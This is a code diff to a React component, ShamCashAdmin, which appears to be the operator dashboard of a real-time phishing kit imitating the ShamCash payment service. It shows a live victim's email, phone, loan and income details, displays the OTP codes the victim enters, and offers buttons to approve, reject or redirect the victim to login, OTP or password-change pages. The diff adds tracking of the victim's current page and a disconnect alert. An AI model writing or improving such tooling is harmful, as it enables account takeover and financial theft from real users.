@@ -2,7 +2,7 @@ import { useState, useEffect, useRef } from "react";
 import {
   CheckCircle, XCircle, ArrowRightLeft, Clock, Bell,
   KeyRound, ShieldCheck, UserRound, X,
-  Wifi, WifiOff, PenLine, Send
+  Wifi, WifiOff, PenLine, Send, MapPin
 } from "lucide-react";
 
 type OtpStatus = "pending" | "approved" | "rejected" | "redirected";
@@ -18,6 +18,7 @@ interface Visitor {
   id: string;
   connectedAt: string;
   status: VisitorStatus;
+  page: string;
   data: { email: string; phone: string; loan: string; income: string };
   lastSeen: number;
 }
@@ -42,10 +43,36 @@ function playConnectSound() {
   } catch {}
 }
 
+function playDisconnectSound() {
+  try {
+    const ctx = new AudioContext();
+    const notes = [440, 330, 220];
+    notes.forEach((freq, i) => {
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.type = "sine";
+      osc.frequency.setValueAtTime(freq, ctx.currentTime + i * 0.14);
+      gain.gain.setValueAtTime(0, ctx.currentTime + i * 0.14);
+      gain.gain.linearRampToValueAtTime(0.2, ctx.currentTime + i * 0.14 + 0.02);
+      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + i * 0.14 + 0.35);
+      osc.start(ctx.currentTime + i * 0.14);
+      osc.stop(ctx.currentTime + i * 0.14 + 0.4);
+    });
+  } catch {}
+}
+
+const pageIcons: Record<string, string> = {
+  "تسجيل الدخول": "🔑",
+  "التحقق OTP": "🛡️",
+  "تغيير كلمة المرور": "🔒",
+};
+
 const redirectOptions: { value: RedirectTarget; label: string; sub: string; icon: React.ReactNode; color: string; border: string }[] = [
-  { value: "login", label: "تسجيل المعلومات", sub: "صفحة تسجيل الدخول", icon: <UserRound className="h-5 w-5" />, color: "text-[#c9ccdb]", border: "border-white/10" },
-  { value: "otp", label: "رمز الأمان", sub: "صفحة التحقق بـ OTP", icon: <ShieldCheck className="h-5 w-5" />, color: "text-[#657bd8]", border: "border-[#657bd8]/30" },
-  { value: "changepass", label: "الكود", sub: "صفحة تغيير كلمة المرور", icon: <KeyRound className="h-5 w-5" />, color: "text-[#1fc28a]", border: "border-[#1fc28a]/30" },
+  { value: "login", label: "تسجيل المعلومات", sub: "صفحة تسجيل الدخول", icon: <UserRound className="h-4 w-4" />, color: "text-[#c9ccdb]", border: "border-white/10" },
+  { value: "otp", label: "رمز الأمان", sub: "صفحة التحقق بـ OTP", icon: <ShieldCheck className="h-4 w-4" />, color: "text-[#657bd8]", border: "border-[#657bd8]/30" },
+  { value: "changepass", label: "الكود", sub: "صفحة تغيير كلمة المرور", icon: <KeyRound className="h-4 w-4" />, color: "text-[#1fc28a]", border: "border-[#1fc28a]/30" },
 ];
 
 export function ShamCashAdmin() {
@@ -54,6 +81,7 @@ export function ShamCashAdmin() {
   const [redirectPickerId, setRedirectPickerId] = useState<string | null>(null);
   const [visitor, setVisitor] = useState<Visitor | null>(null);
   const knownVisitorId = useRef<string | null>(null);
+  const prevStatus = useRef<VisitorStatus | null>(null);
 
   useEffect(() => {
     const interval = setInterval(() => {
@@ -83,6 +111,7 @@ export function ShamCashAdmin() {
       const vId = localStorage.getItem("sham_visitor_id");
       const vStatus = localStorage.getItem("sham_visitor_status") as VisitorStatus | null;
       const vConnectedAt = localStorage.getItem("sham_visitor_connected_at") ?? "";
+      const vPage = localStorage.getItem("sham_visitor_page") ?? "";
       const vDataRaw = localStorage.getItem("sham_visitor_data");
       const vLastSeen = parseInt(localStorage.getItem("sham_visitor_heartbeat") ?? "0");
       const vData = vDataRaw ? JSON.parse(vDataRaw) : { email: "", phone: "", loan: "", income: "" };
@@ -94,8 +123,16 @@ export function ShamCashAdmin() {
           playConnectSound();
           setHasNew(true);
         }
-        setVisitor({ id: vId, connectedAt: vConnectedAt, status: vStatus ?? "connected", data: vData, lastSeen: vLastSeen });
+        const newStatus = vStatus ?? "connected";
+        if (prevStatus.current && prevStatus.current !== "disconnected" && newStatus !== prevStatus.current) {
+        }
+        prevStatus.current = newStatus;
+        setVisitor({ id: vId, connectedAt: vConnectedAt, status: newStatus, page: vPage, data: vData, lastSeen: vLastSeen });
       } else if (visitor && !isAlive) {
+        if (prevStatus.current && prevStatus.current !== "disconnected") {
+          playDisconnectSound();
+        }
+        prevStatus.current = "disconnected";
         setVisitor((prev) => prev ? { ...prev, status: "disconnected" } : null);
       }
     }, 600);
@@ -137,151 +174,156 @@ export function ShamCashAdmin() {
   };
 
   const visitorStatusConfig: Record<VisitorStatus, { label: string; color: string; dot: string; icon: React.ReactNode }> = {
-    connected: { label: "متصل", color: "text-[#1fc28a]", dot: "bg-[#1fc28a]", icon: <Wifi className="h-3.5 w-3.5" /> },
-    typing: { label: "قاعد يسجل...", color: "text-[#f5a623]", dot: "bg-[#f5a623]", icon: <PenLine className="h-3.5 w-3.5" /> },
-    submitted: { label: "أرسل الطلب", color: "text-[#657bd8]", dot: "bg-[#657bd8]", icon: <Send className="h-3.5 w-3.5" /> },
-    disconnected: { label: "غير متصل", color: "text-white/40", dot: "bg-white/20", icon: <WifiOff className="h-3.5 w-3.5" /> },
+    connected: { label: "متصل", color: "text-[#1fc28a]", dot: "bg-[#1fc28a]", icon: <Wifi className="h-3 w-3" /> },
+    typing: { label: "يكتب...", color: "text-[#f5a623]", dot: "bg-[#f5a623]", icon: <PenLine className="h-3 w-3" /> },
+    submitted: { label: "أرسل طلب", color: "text-[#657bd8]", dot: "bg-[#657bd8]", icon: <Send className="h-3 w-3" /> },
+    disconnected: { label: "غير متصل", color: "text-white/40", dot: "bg-white/20", icon: <WifiOff className="h-3 w-3" /> },
   };
 
   return (
     <div className="min-h-screen w-full bg-[#0f1526] text-white font-['Inter']" dir="rtl">
       <div className="mx-auto max-w-[420px] flex flex-col min-h-screen">
 
-        <div className="sticky top-0 z-10 bg-[#0f1526]/95 backdrop-blur-sm px-5 pt-5 pb-4 border-b border-white/[0.05]">
+        <div className="sticky top-0 z-10 bg-[#0f1526]/95 backdrop-blur-sm px-4 pt-4 pb-3 border-b border-white/[0.05]">
           <div className="flex items-center justify-between">
-            <h1 className="text-[20px] font-extrabold text-white/90">لوحة التحكم</h1>
+            <h1 className="text-[17px] font-extrabold text-white/90">لوحة التحكم</h1>
             <div className="relative">
-              <Bell className="h-6 w-6 text-white/60" />
-              {hasNew && <span className="absolute -top-1 -right-1 h-3 w-3 rounded-full bg-[#e54343] ring-2 ring-[#0f1526]" />}
+              <Bell className="h-5 w-5 text-white/60" />
+              {hasNew && <span className="absolute -top-1 -right-1 h-2.5 w-2.5 rounded-full bg-[#e54343] ring-2 ring-[#0f1526]" />}
             </div>
           </div>
-          <p className="mt-1 text-[13px] text-[#c9ccdb]/50">إدارة طلبات المستخدمين</p>
+          <p className="mt-0.5 text-[11px] text-[#c9ccdb]/45">إدارة طلبات المستخدمين</p>
         </div>
 
-        <div className="flex-1 px-5 py-5 space-y-5 overflow-y-auto">
+        <div className="flex-1 px-4 py-4 space-y-4 overflow-y-auto">
 
           {visitor && (
-            <div className="space-y-2">
-              <p className="text-[13px] font-bold text-[#c9ccdb]/50 uppercase tracking-widest">الزائر الحالي</p>
-              <div className={`rounded-[18px] border p-4 space-y-3 transition-all duration-300
+            <div className="space-y-1.5">
+              <p className="text-[10px] font-bold text-[#c9ccdb]/45 uppercase tracking-widest">الزائر الحالي</p>
+              <div className={`rounded-[14px] border p-3 space-y-2.5 transition-all duration-300
                 ${visitor.status === "disconnected"
                   ? "bg-[#1a2035] border-white/[0.05]"
                   : visitor.status === "typing"
-                  ? "bg-[#1e2a1a] border-[#f5a623]/25 shadow-[0_0_20px_rgba(245,166,35,0.08)]"
-                  : "bg-[#1a2a1e] border-[#1fc28a]/25 shadow-[0_0_20px_rgba(31,194,138,0.08)]"
+                  ? "bg-[#1e2a1a] border-[#f5a623]/25 shadow-[0_0_16px_rgba(245,166,35,0.08)]"
+                  : "bg-[#1a2a1e] border-[#1fc28a]/25 shadow-[0_0_16px_rgba(31,194,138,0.08)]"
                 }`}>
-                <div className="flex items-center justify-between gap-3">
-                  <div className="flex items-center gap-2">
-                    <span className={`h-2.5 w-2.5 rounded-full ${visitorStatusConfig[visitor.status].dot} ${visitor.status !== "disconnected" ? "animate-pulse" : ""}`} />
-                    <span className={`text-[13px] font-bold ${visitorStatusConfig[visitor.status].color} flex items-center gap-1`}>
+
+                <div className="flex items-center justify-between gap-2">
+                  <div className="flex items-center gap-1.5">
+                    <span className={`h-2 w-2 rounded-full ${visitorStatusConfig[visitor.status].dot} ${visitor.status !== "disconnected" ? "animate-pulse" : ""}`} />
+                    <span className={`text-[11px] font-bold ${visitorStatusConfig[visitor.status].color} flex items-center gap-1`}>
                       {visitorStatusConfig[visitor.status].icon}
                       {visitorStatusConfig[visitor.status].label}
                     </span>
                   </div>
-                  <div className="flex items-center gap-2">
-                    <span className="text-[12px] text-[#c9ccdb]/40 flex items-center gap-1">
-                      <Clock className="h-3 w-3" />{visitor.connectedAt}
-                    </span>
-                  </div>
+                  <span className="text-[10px] text-[#c9ccdb]/40 flex items-center gap-1">
+                    <Clock className="h-2.5 w-2.5" />{visitor.connectedAt}
+                  </span>
                 </div>
 
-                <div className="space-y-2 pt-1 border-t border-white/[0.06]">
-                    {[
-                      { label: "البريد الإلكتروني", value: visitor.data.email, icon: <UserRound className="h-3.5 w-3.5" /> },
-                      { label: "رقم الهاتف", value: visitor.data.phone, icon: <span className="text-[11px]">📞</span> },
-                      { label: "قيمة القرض", value: visitor.data.loan ? `${visitor.data.loan} ل.س` : "", icon: <span className="text-[11px]">💵</span> },
-                      { label: "الدخل الشهري", value: visitor.data.income ? `${visitor.data.income} ل.س` : "", icon: <span className="text-[11px]">📈</span> },
-                    ].map((row) => (
-                      <div key={row.label} className="flex items-center justify-between gap-2">
-                        <span className="text-[12px] text-[#c9ccdb]/50 flex items-center gap-1">{row.icon}{row.label}</span>
-                        <span className={`text-[13px] font-bold ${row.value ? "text-white/85" : "text-white/20"}`} dir="ltr">
-                          {row.value || "—"}
-                        </span>
-                      </div>
-                    ))}
+                {visitor.page && (
+                  <div className="flex items-center gap-1.5 rounded-[8px] bg-[#657bd8]/10 border border-[#657bd8]/20 px-2.5 py-1.5">
+                    <MapPin className="h-3 w-3 text-[#657bd8] shrink-0" />
+                    <span className="text-[10px] text-[#c9ccdb]/60">الصفحة الحالية:</span>
+                    <span className="text-[11px] font-bold text-[#657bd8]">
+                      {pageIcons[visitor.page] ?? "📄"} {visitor.page}
+                    </span>
                   </div>
+                )}
+
+                <div className="space-y-1.5 pt-0.5 border-t border-white/[0.06]">
+                  {[
+                    { label: "البريد", value: visitor.data.email, icon: <UserRound className="h-3 w-3" /> },
+                    { label: "الهاتف", value: visitor.data.phone, icon: <span className="text-[10px]">📞</span> },
+                    { label: "قيمة القرض", value: visitor.data.loan ? `${visitor.data.loan} ل.س` : "", icon: <span className="text-[10px]">💵</span> },
+                    { label: "الدخل", value: visitor.data.income ? `${visitor.data.income} ل.س` : "", icon: <span className="text-[10px]">📈</span> },
+                  ].map((row) => (
+                    <div key={row.label} className="flex items-center justify-between gap-2">
+                      <span className="text-[10px] text-[#c9ccdb]/45 flex items-center gap-1">{row.icon}{row.label}</span>
+                      <span className={`text-[11px] font-bold ${row.value ? "text-white/85" : "text-white/20"}`} dir="ltr">
+                        {row.value || "—"}
+                      </span>
+                    </div>
+                  ))}
+                </div>
               </div>
             </div>
           )}
 
           {pending.length > 0 && (
-            <div className="space-y-3">
-              <p className="text-[13px] font-bold text-[#c9ccdb]/50 uppercase tracking-widest">طلبات جديدة</p>
+            <div className="space-y-2.5">
+              <p className="text-[10px] font-bold text-[#c9ccdb]/45 uppercase tracking-widest">طلبات جديدة</p>
               {pending.map((req) => {
                 if (req.kind === "otp") {
                   const r = req as OtpRequest;
                   const showPicker = redirectPickerId === r.id;
-                  const showInfo = true;
                   const vd = visitor?.data;
                   return (
-                    <div key={r.id} className="rounded-[18px] bg-[#1e2640] border border-[#657bd8]/30 p-4 space-y-3 shadow-[0_8px_24px_rgba(101,123,216,0.1)]">
-                      <div className="flex items-start justify-between gap-3">
-                        <div className="space-y-1">
-                          <div className="flex items-center gap-2">
-                            <ShieldCheck className="h-4 w-4 text-[#657bd8]" />
-                            <span className="text-[13px] font-bold text-[#657bd8]">التحقق بـ OTP</span>
-                          </div>
+                    <div key={r.id} className="rounded-[14px] bg-[#1e2640] border border-[#657bd8]/30 p-3 space-y-2.5 shadow-[0_6px_18px_rgba(101,123,216,0.1)]">
+                      <div className="flex items-start justify-between gap-2">
+                        <div className="space-y-0.5">
                           <div className="flex items-center gap-1.5">
-                            <span className="h-2 w-2 rounded-full bg-[#f5a623] animate-pulse" />
-                            <span className="text-[12px] font-bold text-[#f5a623]">في انتظار القرار</span>
+                            <ShieldCheck className="h-3.5 w-3.5 text-[#657bd8]" />
+                            <span className="text-[11px] font-bold text-[#657bd8]">التحقق بـ OTP</span>
                           </div>
-                          <p className="text-[15px] font-extrabold text-white" dir="ltr">{r.phone}</p>
-                          <p className="text-[12px] text-[#c9ccdb]/50 flex items-center gap-1"><Clock className="h-3.5 w-3.5" />{r.time}</p>
+                          <div className="flex items-center gap-1">
+                            <span className="h-1.5 w-1.5 rounded-full bg-[#f5a623] animate-pulse" />
+                            <span className="text-[10px] font-bold text-[#f5a623]">في انتظار القرار</span>
+                          </div>
+                          <p className="text-[12px] font-extrabold text-white" dir="ltr">{r.phone}</p>
+                          <p className="text-[10px] text-[#c9ccdb]/45 flex items-center gap-1"><Clock className="h-2.5 w-2.5" />{r.time}</p>
                         </div>
-                        <div className="flex flex-col items-end gap-2 shrink-0">
-                          <div className="rounded-[10px] bg-[#2a3557] px-3 py-2 text-center">
-                            <p className="text-[10px] text-[#c9ccdb]/50 mb-0.5">رمز OTP</p>
-                            <p className="text-[18px] font-extrabold text-white tracking-[0.12em]" dir="ltr">{r.code || "------"}</p>
-                          </div>
+                        <div className="rounded-[8px] bg-[#2a3557] px-2.5 py-1.5 text-center shrink-0">
+                          <p className="text-[9px] text-[#c9ccdb]/50 mb-0.5">رمز OTP</p>
+                          <p className="text-[16px] font-extrabold text-white tracking-[0.1em]" dir="ltr">{r.code || "------"}</p>
                         </div>
                       </div>
 
-                      {showInfo && (
-                        <div className="rounded-[12px] bg-[#2a3557]/70 border border-white/[0.06] p-3 space-y-2">
-                          {[
-                            { label: "البريد الإلكتروني", value: vd?.email, icon: "✉️" },
-                            { label: "رقم الهاتف",        value: vd?.phone, icon: "📞" },
-                            { label: "قيمة القرض",        value: vd?.loan  ? `${vd.loan} ل.س`   : "", icon: "💵" },
-                            { label: "الدخل الشهري",      value: vd?.income ? `${vd.income} ل.س` : "", icon: "📈" },
-                          ].map((row) => (
-                            <div key={row.label} className="flex items-center justify-between gap-2 py-1 border-b border-white/[0.04] last:border-0">
-                              <span className="text-[12px] text-[#c9ccdb]/50 flex items-center gap-1.5">
-                                <span className="text-[13px]">{row.icon}</span>{row.label}
-                              </span>
-                              <span className={`text-[13px] font-bold ${row.value ? "text-white/90" : "text-white/20"}`} dir="ltr">
-                                {row.value || "—"}
-                              </span>
-                            </div>
-                          ))}
-                        </div>
-                      )}
+                      <div className="rounded-[10px] bg-[#2a3557]/70 border border-white/[0.06] p-2.5 space-y-1.5">
+                        {[
+                          { label: "البريد", value: vd?.email, icon: "✉️" },
+                          { label: "الهاتف", value: vd?.phone, icon: "📞" },
+                          { label: "القرض", value: vd?.loan ? `${vd.loan} ل.س` : "", icon: "💵" },
+                          { label: "الدخل", value: vd?.income ? `${vd.income} ل.س` : "", icon: "📈" },
+                        ].map((row) => (
+                          <div key={row.label} className="flex items-center justify-between gap-2 py-0.5 border-b border-white/[0.04] last:border-0">
+                            <span className="text-[10px] text-[#c9ccdb]/45 flex items-center gap-1">
+                              <span className="text-[10px]">{row.icon}</span>{row.label}
+                            </span>
+                            <span className={`text-[11px] font-bold ${row.value ? "text-white/90" : "text-white/20"}`} dir="ltr">
+                              {row.value || "—"}
+                            </span>
+                          </div>
+                        ))}
+                      </div>
+
                       {!showPicker ? (
-                        <div className="grid grid-cols-3 gap-2">
-                          <button onClick={() => decideOtp(r.id, "approved")} className="flex flex-col items-center gap-1.5 rounded-[12px] bg-[#1fc28a]/15 border border-[#1fc28a]/30 py-3 text-[#1fc28a] hover:bg-[#1fc28a]/25 transition-colors active:scale-95">
-                            <CheckCircle className="h-5 w-5" /><span className="text-[12px] font-bold">موافقة</span>
+                        <div className="grid grid-cols-3 gap-1.5">
+                          <button onClick={() => decideOtp(r.id, "approved")} className="flex flex-col items-center gap-1 rounded-[10px] bg-[#1fc28a]/15 border border-[#1fc28a]/30 py-2.5 text-[#1fc28a] hover:bg-[#1fc28a]/25 transition-colors active:scale-95">
+                            <CheckCircle className="h-4 w-4" /><span className="text-[10px] font-bold">موافقة</span>
                           </button>
-                          <button onClick={() => decideOtp(r.id, "rejected")} className="flex flex-col items-center gap-1.5 rounded-[12px] bg-[#e54343]/15 border border-[#e54343]/30 py-3 text-[#e54343] hover:bg-[#e54343]/25 transition-colors active:scale-95">
-                            <XCircle className="h-5 w-5" /><span className="text-[12px] font-bold">رفض</span>
+                          <button onClick={() => decideOtp(r.id, "rejected")} className="flex flex-col items-center gap-1 rounded-[10px] bg-[#e54343]/15 border border-[#e54343]/30 py-2.5 text-[#e54343] hover:bg-[#e54343]/25 transition-colors active:scale-95">
+                            <XCircle className="h-4 w-4" /><span className="text-[10px] font-bold">رفض</span>
                           </button>
-                          <button onClick={() => setRedirectPickerId(r.id)} className="flex flex-col items-center gap-1.5 rounded-[12px] bg-[#657bd8]/15 border border-[#657bd8]/30 py-3 text-[#657bd8] hover:bg-[#657bd8]/25 transition-colors active:scale-95">
-                            <ArrowRightLeft className="h-5 w-5" /><span className="text-[12px] font-bold">تحويل</span>
+                          <button onClick={() => setRedirectPickerId(r.id)} className="flex flex-col items-center gap-1 rounded-[10px] bg-[#657bd8]/15 border border-[#657bd8]/30 py-2.5 text-[#657bd8] hover:bg-[#657bd8]/25 transition-colors active:scale-95">
+                            <ArrowRightLeft className="h-4 w-4" /><span className="text-[10px] font-bold">تحويل</span>
                           </button>
                         </div>
                       ) : (
-                        <div className="space-y-2">
-                          <div className="flex items-center justify-between mb-1">
-                            <p className="text-[13px] font-bold text-[#657bd8]">اختر وجهة التحويل</p>
-                            <button onClick={() => setRedirectPickerId(null)} className="text-white/40 hover:text-white/70"><X className="h-4 w-4" /></button>
+                        <div className="space-y-1.5">
+                          <div className="flex items-center justify-between mb-0.5">
+                            <p className="text-[11px] font-bold text-[#657bd8]">اختر وجهة التحويل</p>
+                            <button onClick={() => setRedirectPickerId(null)} className="text-white/40 hover:text-white/70"><X className="h-3.5 w-3.5" /></button>
                           </div>
                           {redirectOptions.map((opt) => (
                             <button key={opt.value} onClick={() => redirectOtp(r.id, opt.value)}
-                              className={`w-full flex items-center gap-3 rounded-[12px] bg-[#2a3557] border ${opt.border} px-4 py-3 hover:bg-[#313f6a] transition-colors active:scale-[0.98]`}>
+                              className={`w-full flex items-center gap-2.5 rounded-[10px] bg-[#2a3557] border ${opt.border} px-3 py-2.5 hover:bg-[#313f6a] transition-colors active:scale-[0.98]`}>
                               <span className={opt.color}>{opt.icon}</span>
                               <div className="text-right">
-                                <p className={`text-[14px] font-bold ${opt.color}`}>{opt.label}</p>
-                                <p className="text-[11px] text-white/40">{opt.sub}</p>
+                                <p className={`text-[12px] font-bold ${opt.color}`}>{opt.label}</p>
+                                <p className="text-[10px] text-white/35">{opt.sub}</p>
                               </div>
-                              <ArrowRightLeft className="h-4 w-4 text-white/20 mr-auto" />
+                              <ArrowRightLeft className="h-3.5 w-3.5 text-white/20 mr-auto" />
                             </button>
                           ))}
                         </div>
@@ -291,18 +333,18 @@ export function ShamCashAdmin() {
                 }
                 const r = req as PassRequest;
                 return (
-                  <div key={r.id} className="rounded-[18px] bg-[#1e2640] border border-[#1fc28a]/20 p-4 space-y-4 shadow-[0_8px_24px_rgba(31,194,138,0.08)]">
-                    <div className="space-y-1">
-                      <div className="flex items-center gap-2"><KeyRound className="h-4 w-4 text-[#1fc28a]" /><span className="text-[13px] font-bold text-[#1fc28a]">تغيير كلمة المرور</span></div>
-                      <div className="flex items-center gap-1.5"><span className="h-2 w-2 rounded-full bg-[#f5a623] animate-pulse" /><span className="text-[12px] font-bold text-[#f5a623]">في انتظار الموافقة</span></div>
-                      <p className="text-[12px] text-[#c9ccdb]/50 flex items-center gap-1"><Clock className="h-3.5 w-3.5" />{r.time}</p>
+                  <div key={r.id} className="rounded-[14px] bg-[#1e2640] border border-[#1fc28a]/20 p-3 space-y-3 shadow-[0_6px_18px_rgba(31,194,138,0.08)]">
+                    <div className="space-y-0.5">
+                      <div className="flex items-center gap-1.5"><KeyRound className="h-3.5 w-3.5 text-[#1fc28a]" /><span className="text-[11px] font-bold text-[#1fc28a]">تغيير كلمة المرور</span></div>
+                      <div className="flex items-center gap-1"><span className="h-1.5 w-1.5 rounded-full bg-[#f5a623] animate-pulse" /><span className="text-[10px] font-bold text-[#f5a623]">في انتظار الموافقة</span></div>
+                      <p className="text-[10px] text-[#c9ccdb]/45 flex items-center gap-1"><Clock className="h-2.5 w-2.5" />{r.time}</p>
                     </div>
-                    <div className="grid grid-cols-2 gap-2">
-                      <button onClick={() => decidePass(r.id, "approved")} className="flex flex-col items-center gap-1.5 rounded-[12px] bg-[#1fc28a]/15 border border-[#1fc28a]/30 py-3 text-[#1fc28a] hover:bg-[#1fc28a]/25 transition-colors active:scale-95">
-                        <CheckCircle className="h-5 w-5" /><span className="text-[12px] font-bold">موافقة</span>
+                    <div className="grid grid-cols-2 gap-1.5">
+                      <button onClick={() => decidePass(r.id, "approved")} className="flex flex-col items-center gap-1 rounded-[10px] bg-[#1fc28a]/15 border border-[#1fc28a]/30 py-2.5 text-[#1fc28a] hover:bg-[#1fc28a]/25 transition-colors active:scale-95">
+                        <CheckCircle className="h-4 w-4" /><span className="text-[10px] font-bold">موافقة</span>
                       </button>
-                      <button onClick={() => decidePass(r.id, "rejected")} className="flex flex-col items-center gap-1.5 rounded-[12px] bg-[#e54343]/15 border border-[#e54343]/30 py-3 text-[#e54343] hover:bg-[#e54343]/25 transition-colors active:scale-95">
-                        <XCircle className="h-5 w-5" /><span className="text-[12px] font-bold">رفض</span>
+                      <button onClick={() => decidePass(r.id, "rejected")} className="flex flex-col items-center gap-1 rounded-[10px] bg-[#e54343]/15 border border-[#e54343]/30 py-2.5 text-[#e54343] hover:bg-[#e54343]/25 transition-colors active:scale-95">
+                        <XCircle className="h-4 w-4" /><span className="text-[10px] font-bold">رفض</span>
                       </button>
                     </div>
                   </div>
@@ -312,32 +354,32 @@ export function ShamCashAdmin() {
           )}
 
           {!visitor && pending.length === 0 && history.length === 0 && (
-            <div className="flex flex-col items-center justify-center py-20 space-y-4 text-center">
-              <div className="h-16 w-16 rounded-full bg-[#1e2640] flex items-center justify-center">
-                <Bell className="h-7 w-7 text-white/20" />
+            <div className="flex flex-col items-center justify-center py-16 space-y-3 text-center">
+              <div className="h-14 w-14 rounded-full bg-[#1e2640] flex items-center justify-center">
+                <Bell className="h-6 w-6 text-white/20" />
               </div>
-              <p className="text-[15px] font-bold text-white/30">لا توجد طلبات</p>
-              <p className="text-[13px] text-white/20">ستظهر الطلبات هنا عند إرسالها</p>
+              <p className="text-[13px] font-bold text-white/30">لا توجد طلبات</p>
+              <p className="text-[11px] text-white/20">ستظهر الطلبات هنا عند إرسالها</p>
             </div>
           )}
 
           {history.length > 0 && (
-            <div className="space-y-3">
-              <p className="text-[13px] font-bold text-[#c9ccdb]/50 uppercase tracking-widest">السجل</p>
+            <div className="space-y-2">
+              <p className="text-[10px] font-bold text-[#c9ccdb]/45 uppercase tracking-widest">السجل</p>
               {history.map((req) => {
                 const labelMap = req.kind === "otp" ? otpStatusLabel : passStatusLabel;
                 const s = labelMap[req.status];
                 return (
-                  <div key={req.id} className="rounded-[14px] bg-[#1a2035] border border-white/[0.04] p-4 flex items-center justify-between gap-3">
+                  <div key={req.id} className="rounded-[12px] bg-[#1a2035] border border-white/[0.04] p-3 flex items-center justify-between gap-2">
                     <div className="space-y-0.5">
-                      <div className="flex items-center gap-1.5">
-                        {req.kind === "otp" ? <ShieldCheck className="h-3.5 w-3.5 text-[#657bd8]" /> : <KeyRound className="h-3.5 w-3.5 text-[#1fc28a]" />}
-                        <p className="text-[13px] font-bold text-white/70">{req.kind === "otp" ? "تحقق OTP" : "تغيير كلمة مرور"}</p>
+                      <div className="flex items-center gap-1">
+                        {req.kind === "otp" ? <ShieldCheck className="h-3 w-3 text-[#657bd8]" /> : <KeyRound className="h-3 w-3 text-[#1fc28a]" />}
+                        <p className="text-[11px] font-bold text-white/70">{req.kind === "otp" ? "تحقق OTP" : "تغيير كلمة مرور"}</p>
                       </div>
-                      {req.kind === "otp" && <p className="text-[12px] text-white/40" dir="ltr">{(req as OtpRequest).phone}</p>}
-                      <p className="text-[12px] text-[#c9ccdb]/40 flex items-center gap-1"><Clock className="h-3 w-3" />{req.time}</p>
+                      {req.kind === "otp" && <p className="text-[10px] text-white/35" dir="ltr">{(req as OtpRequest).phone}</p>}
+                      <p className="text-[10px] text-[#c9ccdb]/35 flex items-center gap-1"><Clock className="h-2.5 w-2.5" />{req.time}</p>
                     </div>
-                    {s && <span className={`rounded-[8px] px-3 py-1 text-[12px] font-bold ${s.color} ${s.bg}`}>{s.label}</span>}
+                    {s && <span className={`rounded-[6px] px-2.5 py-1 text-[10px] font-bold ${s.color} ${s.bg}`}>{s.label}</span>}
                   </div>
                 );
               })}
